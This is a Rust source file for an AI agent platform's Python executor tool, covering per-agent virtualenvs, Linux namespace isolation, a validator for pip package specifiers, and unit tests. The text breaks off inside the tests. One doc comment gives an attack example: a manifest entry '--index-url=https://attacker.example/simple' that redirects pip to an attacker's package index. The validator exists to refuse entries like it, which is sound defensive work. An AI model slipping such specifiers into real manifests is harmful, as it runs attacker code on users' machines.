//! Native Python executor tool with per-agent virtualenv isolation.
//!
//! Each agent owns a dedicated virtualenv under `<venv_base_dir>/<agent_id>/venv/`.
//! Packages are installed at `INITIALIZING` via `setup_venv()`, never at execution time
//! (fail fast, local-first). The virtualenv is dependency isolation between agents,
//! not an OS sandbox.
//!
//! An installed agent declares its packages up front, so its virtualenv is
//! provisioned before the first run. A chat session declares none and is wired
//! straight into the dispatcher, so its interpreter is created on the first
//! execution instead (see [`PythonExecutor::run`]). Without that, `python_bin`
//! points at a path that was never created and every call fails to spawn.
//!
//! Code is written to a temporary file (never passed via `-c`) to avoid quoting issues
//! and support multi-line scripts. The temp file is always cleaned up after execution.
//!
//! ## Isolation of the interpreter process
//!
//! On Linux, the interpreter runs inside a PID and mount namespace via
//! `unshare --pid --mount --fork`, matching `bash_executor`. When `unshare` is
//! refused, for example on a host without `CAP_SYS_ADMIN`, the interpreter does
//! not start and nothing runs outside the namespace. The failure is relayed as
//! the program's own non-zero exit with `unshare`'s message on stderr, so a
//! caller cannot tell it apart from a script that failed on its own, and a
//! script can forge it. Do not read this path as a fail-closed signal.
//! On macOS there is no OS sandbox; a per-invocation warning is emitted. On every
//! Unix platform, per-process resource limits are applied via `setrlimit`. Python
//! child processes get rlimits everywhere and namespaces on Linux, but no macOS
//! sandbox. The venv/pip setup commands are trusted infrastructure and run
//! without these wrappers.

use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use serde_json::json;
use thiserror::Error;
use tokio::io::AsyncReadExt;

use apollia_core::SandboxProfile;

use crate::descriptor::{ToolDescriptor, ToolKind};
// Only referenced from the Unix spawn paths; the non-Unix build has no rlimits.
#[cfg(unix)]
use crate::tools::rlimits::{apply_rlimits, ResourceLimits};

/// Executor that runs Python code in a per-agent isolated virtualenv.
///
/// The virtualenv lives at `<venv_base_dir>/<agent_id>/venv/`. Packages declared
/// in the agent manifest must be installed via [`PythonExecutor::setup_venv`] at
/// agent `INITIALIZING`, not at execution time.
pub struct PythonExecutor {
    /// Identifier of the agent owning this virtualenv.
    agent_id: String,
    /// Absolute path to the virtualenv: `<venv_base_dir>/<agent_id>/venv/`.
    venv_path: PathBuf,
    /// Absolute path to the Python interpreter inside the venv.
    python_bin: PathBuf,
    /// The system interpreter discovered at construction time, used to build
    /// the virtualenv (`<system_python> -m venv`).
    system_python: crate::tools::python_discovery::PythonCommand,
    /// Set once the virtualenv is known to exist. Guards the on-demand
    /// creation in [`PythonExecutor::run`] so concurrent invocations run
    /// `python -m venv` once rather than racing each other on the same
    /// directory.
    venv_ready: tokio::sync::OnceCell<()>,
}

/// Input parameters for a Python invocation.
pub struct PythonInput {
    /// Python source code to execute. Must not be empty.
    pub code: String,
    /// Hard timeout in seconds before SIGKILL.
    pub timeout_secs: u64,
}

/// Result of a successful Python invocation.
pub struct PythonOutput {
    /// Captured standard output from the Python process.
    pub stdout: String,
    /// Captured standard error from the Python process.
    pub stderr: String,
    /// Exit code reported by the Python process. `-1` if terminated by a signal.
    pub exit_code: i32,
    /// Wall-clock duration of the execution in milliseconds.
    pub duration_ms: u64,
}

/// Errors produced by [`PythonExecutor`].
#[derive(Debug, Error)]
pub enum PythonExecutorError {
    /// `code` is empty, rejected before any I/O (fail fast).
    #[error("code must not be empty")]
    EmptyCode,
    /// No working Python 3 interpreter found on PATH, detected at
    /// construction time (fail fast).
    #[error(
        "no working Python 3 interpreter found on PATH (tried: {tried}). \
         Install Python 3 from python.org and ensure it is on PATH. On \
         Windows, the preinstalled 'python3' alias is a Microsoft Store stub, \
         not an interpreter; install the full distribution or the 'py' \
         launcher."
    )]
    PythonUnavailable {
        /// The candidate commands probed, in order.
        tried: String,
    },
    /// The system Python `-m venv` failed to create the virtualenv.
    #[error("failed to create virtualenv: {0}")]
    VenvCreationFailed(String),
    /// `pip install` failed for a specific package.
    #[error("failed to install package '{package}': {stderr}")]
    PackageInstallFailed {
        /// The package that failed to install.
        package: String,
        /// The stderr output from pip.
        stderr: String,
    },
    /// The Python process exceeded the hard timeout and was killed.
    #[error("python execution timed out after {timeout_secs}s")]
    Timeout {
        /// The configured timeout in seconds.
        timeout_secs: u64,
    },
    /// The OS refused to spawn the Python process.
    #[error("failed to spawn python process: {0}")]
    SpawnFailed(String),
    /// A declared package is not a plain requirement specifier and was refused
    /// before reaching `pip`.
    #[error("refused package specifier '{package}': {reason}")]
    InvalidPackageSpec {
        /// The offending entry, as declared in the manifest.
        package: String,
        /// Why it was refused, phrased for whoever wrote the manifest.
        reason: String,
    },
    /// I/O error reading stdout or stderr from the child process.
    #[error("output capture failed: {0}")]
    OutputCaptureFailed(String),
    /// I/O error writing the temporary Python script file.
    #[error("failed to write temporary script: {0}")]
    TempFileFailed(String),
}

/// Locate the `site-packages` directories of an agent's per-package venv.
///
/// Convention : the venv lives at `<venv_base_dir>/<agent_name>/venv/`.
/// On Unix : `lib/python<X.Y>/site-packages` (we glob `lib/*/site-packages`).
/// On Windows : `Lib/site-packages`.
///
/// Returns an empty vec if the venv does not exist; the caller should
/// treat that as "no extra sys.path needed" (agent declares no pip packages).
///
/// This helper is canonical and shared by all callers that need to inject
/// the agent's venv into PyO3's `sys.path` before importing the Python
/// module (agent runtime backends, validation flows, CLI commands).
pub fn agent_venv_site_packages(venv_base_dir: &Path, agent_name: &str) -> Vec<PathBuf> {
    let venv_path = venv_base_dir
        .join(venv_dir_component(agent_name))
        .join("venv");
    if !venv_path.is_dir() {
        return Vec::new();
    }
    let mut candidates = Vec::new();
    let lib = venv_path.join("lib");
    if lib.is_dir() {
        if let Ok(entries) = std::fs::read_dir(&lib) {
            for entry in entries.flatten() {
                let sp = entry.path().join("site-packages");
                if sp.is_dir() {
                    candidates.push(sp);
                }
            }
        }
    }
    let win_lib = venv_path.join("Lib").join("site-packages");
    if win_lib.is_dir() {
        candidates.push(win_lib);
    }
    candidates
}

/// Directory name holding an agent's virtualenv, safe on every platform.
///
/// An agent identifier is not constrained to be a filename: the chat sessions
/// use `apollia:chat:<uuid>`, and `:` is illegal in a Windows path component,
/// so the raw identifier made the whole tool unusable there. Everything outside
/// the portable set collapses to `_`; ordinary agent names are unchanged.
pub fn venv_dir_component(agent_id: &str) -> String {
    let sanitized: String = agent_id
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.') {
                c
            } else {
                '_'
            }
        })
        .collect();
    // An empty component collapses onto the base directory, and a component of
    // dots alone resolves to the parent one.
    if sanitized.is_empty() || sanitized.chars().all(|c| c == '.') {
        return "_".to_string();
    }
    sanitized
}

/// Path to an executable inside a virtualenv, per platform layout.
///
/// `venv/bin/<name>` on POSIX, `venv/Scripts/<name>.exe` on Windows. Hardcoding
/// the POSIX shape left every per-agent virtualenv unusable on Windows: neither
/// the interpreter nor `pip` resolved, so package installation and agent
/// execution both failed.
pub fn venv_script(venv_path: &Path, name: &str) -> PathBuf {
    if cfg!(windows) {
        venv_path.join("Scripts").join(format!("{name}.exe"))
    } else {
        venv_path.join("bin").join(name)
    }
}

/// Longest accepted requirement specifier. Real ones are far shorter; a long
/// entry is either a mistake or an attempt to smuggle something through.
const MAX_PACKAGE_SPEC_LEN: usize = 200;

/// A plain PEP 508 requirement without its marker: name, optional extras,
/// optional version specifiers. Deliberately narrower than the full grammar,
/// which also allows direct URL references.
static PACKAGE_SPEC_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
    // SAFETY: compiled from a literal pattern, so it cannot fail at runtime.
    #[allow(clippy::unwrap_used)]
    regex::Regex::new(concat!(
        r"^[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?",
        r"(?:\[[A-Za-z0-9][A-Za-z0-9._,-]*\])?",
        r"(?:\s*(?:===|==|!=|~=|>=|<=|>|<)\s*[A-Za-z0-9][A-Za-z0-9._*+!-]*",
        r"(?:\s*,\s*(?:===|==|!=|~=|>=|<=|>|<)\s*[A-Za-z0-9][A-Za-z0-9._*+!-]*)*)?$",
    ))
    // SAFETY: the pattern is a compile-time literal, so a failure here would be
    // a build-time authoring error rather than a runtime condition.
    .expect("PEP 508 requirement regex is a valid literal")
});

/// The closed set of environment-marker variables defined by PEP 508.
///
/// Checked against explicitly rather than with a permissive character class: a
/// charset that merely allows letters and spaces accepts `; import os`, which is
/// not a marker at all. Anything outside this vocabulary is refused.
const MARKER_VARIABLES: &[&str] = &[
    "python_version",
    "python_full_version",
    "os_name",
    "sys_platform",
    "platform_release",
    "platform_system",
    "platform_version",
    "platform_machine",
    "platform_python_implementation",
    "implementation_name",
    "implementation_version",
    "extra",
];

/// Accepts an environment marker built only from PEP 508 vocabulary.
///
/// Every bare word must be a marker variable or a boolean/membership operator;
/// everything else must be a quoted literal, an operator or punctuation.
fn marker_is_wellformed(marker: &str) -> bool {
    if marker.trim().is_empty() {
        return false;
    }
    let mut rest = marker;
    while let Some(start) = rest.find(['"', '\'']) {
        let quote = rest.as_bytes()[start];
        let after = &rest[start + 1..];
        let Some(end) = after.find(quote as char) else {
            return false; // unterminated literal
        };
        if !bare_words_are_marker_vocabulary(&rest[..start]) {
            return false;
        }
        // Literals themselves are opaque; only their content charset matters.
        if after[..end].chars().any(|c| c.is_control()) {
            return false;
        }
        rest = &after[end + 1..];
    }
    bare_words_are_marker_vocabulary(rest)
}

/// Every alphabetic token outside quotes must belong to the marker vocabulary.
fn bare_words_are_marker_vocabulary(segment: &str) -> bool {
    segment
        .split(|c: char| !(c.is_alphanumeric() || c == '_'))
        .filter(|w| !w.is_empty() && w.chars().any(|c| c.is_alphabetic()))
        .all(|w| MARKER_VARIABLES.contains(&w) || matches!(w, "and" | "or" | "not" | "in"))
}

/// Rejects anything that is not a plain package requirement.
///
/// # Why this exists
///
/// `setup_venv` passes each declared package straight into
/// `pip install <package>` as an argv element. `pip` reads any element starting
/// with `-` as a **flag**, not as a package name, so a manifest declaring
/// `packages = ["--index-url=https://attacker.example/simple", "requests"]`
/// silently redirects the package index and gets attacker-controlled code
/// executed by `setup.py` at install time, with the user's rights and before any
/// sandbox is involved. `-e`, `-r`, `--pre` and `--extra-index-url` are the same
/// class. There is no shell here, so this is not shell injection: it is argv
/// injection into `pip`, which is just as effective.
///
/// Direct references (`pkg @ https://...`), VCS URLs (`git+https://...`) and
/// local paths are refused too. They are legal PEP 508 but they all mean "fetch
/// and execute code from somewhere this manifest chose", which is exactly what
/// the declaration is not allowed to decide.
pub fn validate_package_spec(package: &str) -> Result<(), PythonExecutorError> {
    let refuse = |reason: &str| {
        Err(PythonExecutorError::InvalidPackageSpec {
            package: package.to_string(),
            reason: reason.to_string(),
        })
    };

    let spec = package.trim();
    if spec.is_empty() {
        return refuse("empty entry");
    }
    if spec.len() > MAX_PACKAGE_SPEC_LEN {
        return refuse("longer than a requirement specifier can legitimately be");
    }
    if spec.chars().any(|c| c.is_control()) {
        return refuse("contains a control character");
    }
    // The load-bearing check: pip would treat this as an option.
    if spec.starts_with('-') {
        return refuse(
            "starts with '-', which pip reads as a command-line flag rather than a package",
        );
    }
    if spec.contains('@') {
        return refuse(
            "direct URL references are not accepted, declare a released version instead",
        );
    }
    if spec.contains("://") || spec.starts_with("git+") || spec.starts_with("file:") {
        return refuse("URLs are not accepted, declare a released version instead");
    }
    if spec.starts_with('.') || spec.starts_with('/') || spec.contains('/') {
        return refuse("local paths are not accepted, declare a released version instead");
    }
    // Split off the environment marker, which has its own closed vocabulary.
    let (requirement, marker) = match spec.split_once(';') {
        Some((req, marker)) => (req.trim(), Some(marker.trim())),
        None => (spec, None),
    };
    if !PACKAGE_SPEC_RE.is_match(requirement) {
        return refuse(
            "not a plain requirement specifier (name, optional extras, optional version)",
        );
    }
    if let Some(marker) = marker {
        if !marker_is_wellformed(marker) {
            return refuse("environment marker uses something other than PEP 508 vocabulary");
        }
    }
    Ok(())
}

impl PythonExecutor {
    /// Creates a `PythonExecutor` for the given agent.
    ///
    /// Locates a working system Python 3 via
    /// [`crate::tools::python_discovery::locate_system_python`] (per-platform
    /// candidate order, Microsoft Store stub rejected). Does **not** create
    /// the virtualenv: an agent declaring packages gets it from
    /// [`setup_venv`][Self::setup_venv] at `INITIALIZING`, and any other caller
    /// gets it from the first [`run`][Self::run].
    ///
    /// # Errors
    ///
    /// Returns [`PythonExecutorError::PythonUnavailable`] when no probed
    /// candidate is a working Python 3; the message names what was tried and
    /// how to install one.
    pub fn new(agent_id: &str, venv_base_dir: &Path) -> Result<Self, PythonExecutorError> {
        // Fail fast: locate the system interpreter at construction time.
        let system_python = crate::tools::python_discovery::locate_system_python()?;

        let venv_path = venv_base_dir
            .join(venv_dir_component(agent_id))
            .join("venv");
        let python_bin = venv_script(&venv_path, "python");

        Ok(Self {
            agent_id: agent_id.to_string(),
            venv_path,
            python_bin,
            system_python,
            venv_ready: tokio::sync::OnceCell::new(),
        })
    }

    /// Creates the virtualenv and installs the declared packages.
    ///
    /// Idempotent: if the virtualenv already exists and the Python interpreter is present,
    /// creation is skipped and package installation proceeds normally. This allows agents
    /// to go through INITIALIZING multiple times without recreating the venv.
    ///
    /// Called at agent `INITIALIZING` when the manifest declares packages, and
    /// from [`run`][Self::run] with an empty list when the virtualenv is still
    /// missing at execution time. May take time if packages are numerous.
    /// Installing packages at execution time remains forbidden by design: the
    /// execution-time call never carries any.
    ///
    /// # Errors
    ///
    /// - [`PythonExecutorError::VenvCreationFailed`]: the system Python `-m venv` failed
    /// - [`PythonExecutorError::PackageInstallFailed`]: `pip install <package>` failed
    pub async fn setup_venv(&self, packages: &[String]) -> Result<(), PythonExecutorError> {
        // Refuse the whole list before touching the filesystem. An agent manifest
        // is untrusted input and every entry becomes an argv element for `pip`,
        // so this is the chokepoint that keeps a flag out of that position.
        // Validating upfront also avoids a half-populated virtualenv.
        for package in packages {
            validate_package_spec(package)?;
        }

        // Idempotent: skip creation if the venv interpreter already resolves to a live binary.
        // `Path::exists()` follows symlinks: returns false for broken symlinks.
        // This handles INITIALIZING restarts without blowing away installed packages.
        if self.python_bin.exists() {
            tracing::info!(
                agent_id = %self.agent_id,
                "python_executor: virtualenv already exists, skipping creation"
            );
        } else {
            // `--clear` purges any existing (possibly broken) venv directory before recreating.
            // This handles stale venvs whose interpreter symlinks point to a removed Python.
            let venv_args: &[&str] = if self.venv_path.is_dir() {
                &["-m", "venv", "--clear"]
            } else {
                &["-m", "venv"]
            };

            tracing::info!(
                agent_id = %self.agent_id,
                venv_path = %self.venv_path.display(),
                clear = self.venv_path.is_dir(),
                "python_executor: creating virtualenv"
            );

            let venv_path_str = self.venv_path.to_str().unwrap_or("");
            let mut cmd_args: Vec<&str> = venv_args.to_vec();
            cmd_args.push(venv_path_str);

            // The venv must be built by the interpreter the operator has, with
            // its own standard library. Inheriting the desktop's PYTHONHOME
            // would seed it from the bundle instead.
            let mut venv_cmd = tokio::process::Command::new(&self.system_python.program);
            venv_cmd.args(&self.system_python.args);
            apollia_core::subprocess_env::scrub_bundled_python_async(&mut venv_cmd);
            apollia_core::subprocess_window::hide_console_async(&mut venv_cmd);
            let venv_output = venv_cmd
                .args(&cmd_args)
                .output()
                .await
                .map_err(|e| PythonExecutorError::VenvCreationFailed(e.to_string()))?;

            if !venv_output.status.success() {
                let stderr = String::from_utf8_lossy(&venv_output.stderr).into_owned();
                return Err(PythonExecutorError::VenvCreationFailed(stderr));
            }
        }

        let pip_bin = venv_script(&self.venv_path, "pip");

        for package in packages {
            tracing::info!(
                agent_id = %self.agent_id,
                package = %package,
                "python_executor: installing package"
            );

            let mut pip_cmd = tokio::process::Command::new(&pip_bin);
            apollia_core::subprocess_env::scrub_bundled_python_async(&mut pip_cmd);
            apollia_core::subprocess_window::hide_console_async(&mut pip_cmd);
            let pip_output = pip_cmd
                .args(["install", package.as_str(), "--quiet"])
                .output()
                .await
                .map_err(|e| PythonExecutorError::PackageInstallFailed {
                    package: package.clone(),
                    stderr: e.to_string(),
                })?;

            if !pip_output.status.success() {
                let stderr = String::from_utf8_lossy(&pip_output.stderr).into_owned();
                return Err(PythonExecutorError::PackageInstallFailed {
                    package: package.clone(),
                    stderr,
                });
            }
        }

        Ok(())
    }

    /// Executes Python code in the agent's virtualenv.
    ///
    /// The virtualenv is created here when it does not exist yet, once per
    /// executor. Callers that provision it up front (an installed agent going
    /// through `INITIALIZING`) pay nothing but a `Path::exists()`; callers wired
    /// straight into a dispatcher, such as a chat session, get their
    /// interpreter on the call that needs it rather than a failed spawn. The
    /// cost is borne by the first execution instead of by every session start,
    /// most of which never run Python at all.
    ///
    /// Code is written to a temporary file and always cleaned up after execution,
    /// even on timeout or error.
    ///
    /// # Errors
    ///
    /// - [`PythonExecutorError::EmptyCode`]: `code` is empty (checked before any I/O)
    /// - [`PythonExecutorError::VenvCreationFailed`]: the virtualenv did not exist
    ///   and `python -m venv` failed to create it
    /// - [`PythonExecutorError::Timeout`]: process exceeded `timeout_secs`; killed, no zombie
    /// - [`PythonExecutorError::SpawnFailed`]: OS refused to spawn the process
    /// - [`PythonExecutorError::OutputCaptureFailed`]: I/O error reading stdout/stderr
    /// - [`PythonExecutorError::TempFileFailed`]: could not write the temporary script file
    pub async fn run(&self, input: PythonInput) -> Result<PythonOutput, PythonExecutorError> {
        // Fail fast: validate before any I/O.
        if input.code.trim().is_empty() {
            return Err(PythonExecutorError::EmptyCode);
        }

        self.ensure_venv().await?;

        // Write code to a temp file to avoid shell-quoting issues with -c.
        let script_path = std::env::temp_dir().join(format!("apollia_{}.py", uuid::Uuid::new_v4()));

        tokio::fs::write(&script_path, &input.code)
            .await
            .map_err(|e| PythonExecutorError::TempFileFailed(e.to_string()))?;

        let result = self.execute_script(&script_path, input.timeout_secs).await;

        // Always remove the temp file, success or error (no file leak).
        let _ = tokio::fs::remove_file(&script_path).await;

        result
    }

    /// Creates the virtualenv if it is missing, at most once per executor.
    ///
    /// A failed attempt leaves the guard unset, so the next execution retries
    /// instead of inheriting a permanent failure from a transient one (a full
    /// disk, a directory not yet writable).
    async fn ensure_venv(&self) -> Result<(), PythonExecutorError> {
        self.venv_ready
            .get_or_try_init(|| async {
                // No packages: an agent that declares some has already been
                // provisioned by `setup_venv` at INITIALIZING, and installing
                // at execution time is forbidden by design.
                self.setup_venv(&[]).await
            })
            .await
            .map(|_| ())
    }

    /// Returns the [`ToolDescriptor`] for registration in [`crate::registry::ToolRegistry`].
    pub fn descriptor() -> ToolDescriptor {
        ToolDescriptor {
            name: "python_executor".to_string(),
            version: "1.0.0".to_string(),
            description: "Execute Python code in the agent's virtualenv. Only pre-installed \
                          packages are available. Write focused scripts that do one thing well."
                .to_string(),
            kind: ToolKind::Native,
            input_schema: json!({
                "type": "object",
                "required": ["code", "timeout_secs"],
                "properties": {
                    "code": {
                        "type": "string",
                        "description": "Python source code to execute"
                    },
                    "timeout_secs": {
                        "type": "integer",
                        "minimum": 1,
                        "maximum": 300,
                        "description": "Hard timeout in seconds before SIGKILL"
                    }
                }
            }),
            output_schema: Some(json!({
                "type": "object",
                "properties": {
                    "stdout":      { "type": "string" },
                    "stderr":      { "type": "string" },
                    "exit_code":   { "type": "integer" },
                    "duration_ms": { "type": "integer" }
                }
            })),
            sandbox_profile: SandboxProfile::FileSystem,
            tags: vec!["python".to_string(), "scripting".to_string()],
            dangerous: false,
            is_read_only: false,
            risk_score: 8,
            approval_risk_level: None,
            impact_description: None,
            reject_reason_required: false,
        }
    }

    /// Builds the OS-appropriate command for running `script_path`.
    ///
    /// On Linux the interpreter is wrapped in `unshare --pid --mount --fork` for
    /// PID and mount namespace isolation (parity with `bash_executor`). On other
    /// platforms it runs directly with a per-invocation dev-mode warning. On every
    /// Unix platform, per-process resource limits are attached via `pre_exec`; they
    /// are inherited across `unshare --fork`, so they reach the interpreter.
    #[cfg(target_os = "linux")]
    fn build_command(&self, script_path: &Path) -> tokio::process::Command {
        let mut cmd = std::process::Command::new("/usr/bin/unshare");
        cmd.arg("--pid").arg("--mount").arg("--fork");
        cmd.arg(&self.python_bin).arg(script_path);
        apply_rlimits(&mut cmd, ResourceLimits::v0_defaults());
        tokio::process::Command::from(cmd)
    }

    #[cfg(not(target_os = "linux"))]
    fn build_command(&self, script_path: &Path) -> tokio::process::Command {
        tracing::warn!(
            agent_id = %self.agent_id,
            "python_executor: running in Dev mode - no sandbox active. \
             Linux namespaces are not available on this platform. \
             Production deployments require Linux."
        );
        let mut cmd = std::process::Command::new(&self.python_bin);
        cmd.arg(script_path);
        // python_bin is the agent's venv interpreter. PYTHONHOME would override
        // the venv's own prefix and defeat the isolation the venv exists for.
        apollia_core::subprocess_env::scrub_bundled_python(&mut cmd);
        apollia_core::subprocess_window::hide_console(&mut cmd);
        #[cfg(unix)]
        apply_rlimits(&mut cmd, ResourceLimits::v0_defaults());
        tokio::process::Command::from(cmd)
    }

    /// Spawns the Python interpreter on the given script file with a hard timeout.
    ///
    /// On timeout: reader tasks are aborted, child is killed and reaped (no zombie).
    async fn execute_script(
        &self,
        script_path: &Path,
        timeout_secs: u64,
    ) -> Result<PythonOutput, PythonExecutorError> {
        let mut cmd = self.build_command(script_path);
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());

        let mut child = cmd
            .spawn()
            .map_err(|e| PythonExecutorError::SpawnFailed(e.to_string()))?;

        // Take pipes before `wait` to avoid pipe-buffer deadlock on large outputs.
        let mut stdout_pipe = child.stdout.take().ok_or_else(|| {
            PythonExecutorError::OutputCaptureFailed("stdout pipe missing".to_string())
        })?;
        let mut stderr_pipe = child.stderr.take().ok_or_else(|| {
            PythonExecutorError::OutputCaptureFailed("stderr pipe missing".to_string())
        })?;

        // Drain stdout/stderr concurrently in background tasks.
        // Without this, large outputs would fill the pipe buffer and deadlock `wait`.
        let stdout_task = tokio::spawn(async move {
            let mut buf = Vec::new();
            stdout_pipe.read_to_end(&mut buf).await.map(|_| buf)
        });
        let stderr_task = tokio::spawn(async move {
            let mut buf = Vec::new();
            stderr_pipe.read_to_end(&mut buf).await.map(|_| buf)
        });

        let start = Instant::now();

        // Wait for process exit with a hard timeout.
        // On timeout: abort reader tasks, kill child, wait to reap (no zombie).
        let status = tokio::select! {
            result = child.wait() => {
                result.map_err(|e| PythonExecutorError::OutputCaptureFailed(e.to_string()))?
            }
            _ = tokio::time::sleep(Duration::from_secs(timeout_secs)) => {
                stdout_task.abort();
                stderr_task.abort();
                let _ = child.kill().await;
                let _ = child.wait().await;
                return Err(PythonExecutorError::Timeout { timeout_secs });
            }
        };

        let duration_ms = start.elapsed().as_millis() as u64;

        let stdout_bytes = stdout_task
            .await
            .map_err(|e| PythonExecutorError::OutputCaptureFailed(e.to_string()))?
            .map_err(|e| PythonExecutorError::OutputCaptureFailed(e.to_string()))?;

        let stderr_bytes = stderr_task
            .await
            .map_err(|e| PythonExecutorError::OutputCaptureFailed(e.to_string()))?
            .map_err(|e| PythonExecutorError::OutputCaptureFailed(e.to_string()))?;

        Ok(PythonOutput {
            stdout: String::from_utf8_lossy(&stdout_bytes).into_owned(),
            stderr: String::from_utf8_lossy(&stderr_bytes).into_owned(),
            exit_code: status.code().unwrap_or(-1),
            duration_ms,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn test_venv_dir() -> PathBuf {
        std::env::temp_dir().join("apollia_test_venv")
    }

    /// Returns `true` if the platform can actually execute scripts through our
    /// `build_command` path. On Linux without `CAP_SYS_ADMIN` (e.g. GitHub
    /// Actions runners), `unshare --pid --mount` fails with EPERM inside the
    /// spawned child, so `run()` returns `Ok` with the sandbox failure as the
    /// program's own output: tests asserting on that output must be skipped
    /// gracefully. Mirrors `can_run_shell` in `bash_executor`.
    fn can_run_sandbox() -> bool {
        #[cfg(target_os = "linux")]
        {
            apollia_core::SecurityPosture::detect().unshare_available
        }
        #[cfg(not(target_os = "linux"))]
        {
            true
        }
    }

    /// Helper: creates a PythonExecutor, skipping the test if no system Python is available.
    macro_rules! make_executor {
        ($agent_id:expr) => {
            match PythonExecutor::new($agent_id, &test_venv_dir()) {
                Ok(e) => e,
                Err(PythonExecutorError::PythonUnavailable { .. }) => return,
                Err(e) => panic!("unexpected error creating executor: {:?}", e),
            }
        };
    }

    #[tokio::test]
    async fn test_simple_print_returns_stdout() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN
        let executor = make_executor!("test-agent-ac1");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "print('hello')".to_string(),
            timeout_secs: 30,
        };
        // WHEN
        let output = executor.run(input).await.expect("execution failed");
        // THEN
        assert_eq!(output.stdout.trim(), "hello");
        assert_eq!(output.stderr, "");
        assert_eq!(output.exit_code, 0);
    }

    /// RLIMIT_AS is applied on Linux only (macOS rejects setting it). Allocating
    /// past the cap must fail inside the interpreter rather than exhaust the host.
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn test_address_space_limit_blocks_large_allocation() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN a python executor (rlimits use v0 defaults: 2 GiB address space)
        let executor = make_executor!("test-agent-as-cap");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "x = bytearray(4 * 1024 * 1024 * 1024)".to_string(),
            timeout_secs: 30,
        };
        // WHEN allocating past the cap
        let output = match executor.run(input).await {
            Ok(o) => o,
            // Namespace spawn fails closed without CAP_SYS_ADMIN (e.g. CI): skip.
            Err(PythonExecutorError::SpawnFailed(_)) => return,
            Err(e) => panic!("unexpected error: {e:?}"),
        };
        // THEN the interpreter cannot allocate and exits non-zero
        assert_ne!(output.exit_code, 0, "allocation past RLIMIT_AS must fail");
        assert!(
            output.stderr.contains("MemoryError"),
            "expected MemoryError, got: {}",
            output.stderr
        );
    }

    #[test]
    fn test_python_unavailable_detected_at_construction() {
        // GIVEN: we test the happy path: if a system Python is present, new() succeeds.
        // The error case (PythonUnavailable) is covered implicitly by make_executor! in other tests.
        let result = PythonExecutor::new("test-agent-ac2", &test_venv_dir());
        match result {
            Ok(_) => { /* system Python present - construction succeeded as expected */ }
            Err(PythonExecutorError::PythonUnavailable { .. }) => {
                /* no system Python - also valid */
            }
            Err(e) => panic!("unexpected error: {:?}", e),
        }
    }

    #[tokio::test]
    async fn test_import_missing_package_returns_nonzero_exit() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN: venv with no extra packages
        let executor = make_executor!("test-agent-ac3");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "import pandas".to_string(),
            timeout_secs: 30,
        };
        // WHEN
        let output = executor
            .run(input)
            .await
            .expect("should not be a Rust error");
        // THEN: Python process exits non-zero, stderr contains ModuleNotFoundError
        assert_ne!(output.exit_code, 0);
        assert!(
            output.stderr.contains("ModuleNotFoundError")
                || output.stderr.contains("No module named"),
            "expected ModuleNotFoundError in stderr, got: {}",
            output.stderr
        );
    }

    #[tokio::test]
    async fn test_timeout_kills_python_process() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN
        let executor = make_executor!("test-agent-ac4");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "import time; time.sleep(60)".to_string(),
            timeout_secs: 1,
        };
        // WHEN
        let result = executor.run(input).await;
        // THEN
        assert!(
            matches!(result, Err(PythonExecutorError::Timeout { .. })),
            "expected Timeout error, got: {:?}",
            result.err()
        );
    }

    #[tokio::test]
    async fn test_empty_code_rejected_immediately() {
        // GIVEN
        let executor = make_executor!("test-agent-ac5");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "".to_string(),
            timeout_secs: 10,
        };
        // WHEN / THEN
        assert!(matches!(
            executor.run(input).await,
            Err(PythonExecutorError::EmptyCode)
        ));
    }

    #[tokio::test]
    async fn test_whitespace_only_code_rejected() {
        // GIVEN: whitespace-only is also empty
        let executor = make_executor!("test-agent-ac5-ws");
        executor.setup_venv(&[]).await.expect("venv setup failed");
        let input = PythonInput {
            code: "   \n\t  ".to_string(),
            timeout_secs: 10,
        };
        // WHEN / THEN
        assert!(matches!(
            executor.run(input).await,
            Err(PythonExecutorError::EmptyCode)
        ));
    }

    #[tokio::test]
    async fn test_isolation_between_agents() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN: two executors for different agents, both with empty venvs
        let executor_a = make_executor!("test-agent-isolation-a");
        let executor_b = make_executor!("test-agent-isolation-b");
        executor_a
            .setup_venv(&[])
            .await
            .expect("venv A setup failed");
        executor_b
            .setup_venv(&[])
            .await
            .expect("venv B setup failed");

        // WHEN: import something that does exist in stdlib (venv-independent)
        let input_a = PythonInput {
            code: "import os; print(os.name)".to_string(),
            timeout_secs: 10,
        };
        let output_a = executor_a.run(input_a).await.expect("agent A failed");

        let input_b = PythonInput {
            code: "import os; print(os.name)".to_string(),
            timeout_secs: 10,
        };
        let output_b = executor_b.run(input_b).await.expect("agent B failed");

        // THEN: both agents run in their own venv, both succeed independently
        assert_eq!(output_a.exit_code, 0);
        assert_eq!(output_b.exit_code, 0);
        // Both venvs are separate directories
        assert_ne!(executor_a.venv_path, executor_b.venv_path);
    }

    #[test]
    fn test_descriptor_is_valid() {
        // GIVEN / WHEN
        let descriptor = PythonExecutor::descriptor();
        // THEN
        assert_eq!(descriptor.name, "python_executor");
        assert!(descriptor.validate().is_ok());
    }

    // ── Package specifier validation ─────────────────────────────────────────

    fn reason_for(spec: &str) -> String {
